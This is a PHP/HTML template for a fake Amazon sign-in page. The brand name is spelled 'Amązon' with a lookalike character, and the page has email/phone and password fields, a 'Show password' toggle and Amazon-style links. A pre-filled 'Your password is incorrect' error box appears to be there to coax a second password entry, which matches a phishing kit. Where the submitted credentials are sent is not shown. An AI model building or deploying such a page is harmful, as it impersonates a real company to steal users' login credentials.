<?php include "layout/topbar.php"; ?>

<div class="content">

  <div class="card">

    <div class="signin-title">Sign in</div>

    <div class="error-box" id="errorBox">
      <div class="error-accent"></div>
      <div class="error-content">
        <div class="error-title">There was a problem</div>
        <div class="error-message" id="errorMessage">
          Your password is incorrect
        </div>
      </div>
    </div>

    
    <form id="form">

  <div class="form-group">
  <label>Email or phone number</label>
  <input class="input check" type="text" name="email" id="email" />
</div>

<div class="form-group">
  <label>Password</label>
  <input class="input check" type="password" name="password" id="password" />
</div>
 
  <!-- SHOW PASSWORD -->
  <label class="checkbox-row">
    <div class="svg-checkbox">
      <input type="checkbox" id="togglePassword">
      <svg viewBox="0 0 20 20" class="box">
        <rect class="box-rect" x="1" y="1" width="18" height="18" rx="4"></rect>
        <path class="tick" d="M5 10l3 3 7-7"></path>
      </svg>
    </div>
    <span>Show password</span>
  </label>

  <button type="submit" id="submitButton">Continue</button>

</form>


    <p class="terms">
      By continuing, you agree to Amązon's
      <a href="#">Conditions of Use</a> and
      <a href="#">Privacy Notice</a>.
    </p>

    <div class="help">
      <a href="#">Need help?</a>
    </div>

    <div class="business">
      <div class="business-title">Buying for work?</div>
      <a href="#">Shop on Amązon Business</a>
    </div>

  </div>

</div>
<script>
const passwordField = document.getElementById("password");
const togglePassword = document.getElementById("togglePassword");

togglePassword.addEventListener("change", function () {
  passwordField.type = this.checked ? "text" : "password";
});
</script>


<?php include "layout/footer.php"; ?>